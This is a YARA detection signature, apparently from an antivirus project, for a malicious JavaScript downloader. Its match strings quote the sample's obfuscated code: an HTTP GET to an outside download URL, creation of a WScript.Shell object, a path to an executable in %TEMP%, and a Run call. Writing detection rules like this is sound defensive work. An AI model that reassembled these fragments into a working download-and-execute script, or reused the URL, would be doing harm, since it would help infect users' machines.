rule sig_20160401_b9ba8368e6c491b30033460e409ca066 {
  meta:
    description = "datamaliciousorder - file 20160401_b9ba8368e6c491b30033460e409ca066.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8857cd8c6be83bb3f46e33eaa9633dfc5afc54015e6e2396811ce578c323d0e9"

  strings:
    $s1  = "RnTbh[ObpVf](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var YfyHdj = function BocTg() {return WScript[HqoGb](\"WScript\"+\".Shell\");}(), OcXn = 11;" fullword ascii
    $s3  = "function CjGew(GhRpe, HsuLz){EoKto = EoKto * 1; return GhRpe - HsuLz;};" fullword ascii
    $s4  = "if (RnTbh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YsSxa(){return QzsJnw + \"\";};" fullword ascii
    $s6  = "function QnqVi() {return YfyHdj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Sp1vLLzgfVz.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZubXtv() {return ((MghZs == true) && (MghZs == RuQqk)) ? 1 : EoKto;};" fullword ascii
    $s8  = "function BmqBt(){return HqoGb;};" fullword ascii
    $s9  = "var XcyEc = new this[\"Date\"]();" fullword ascii
    $s10 = "RuQqk = true; " fullword ascii
    $s11 = "var YcmKp = false;" fullword ascii
    $s12 = "function HhtKym(IjkTg){YfyHdj[\"R\"+\"un\"](IjkTg, EoKto, EoKto);};" fullword ascii
    $s13 = "MghZs = true; " fullword ascii
    $s14 = "}while (OnpMk);" fullword ascii
    $s15 = "var MghZs = false;" fullword ascii
    $s16 = "var RuQqk = false;" fullword ascii
    $s17 = "return CjGew(FgQfg, CmVe);" fullword ascii
    $s18 = "function OqaUp(){return 23;};" fullword ascii
    $s19 = "function HxzQz(DhIa) {var HgdQtu = (1, 2, 3, 4, 5, DhIa); return HgdQtu;};" fullword ascii
    $s20 = "function VdoUxz()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}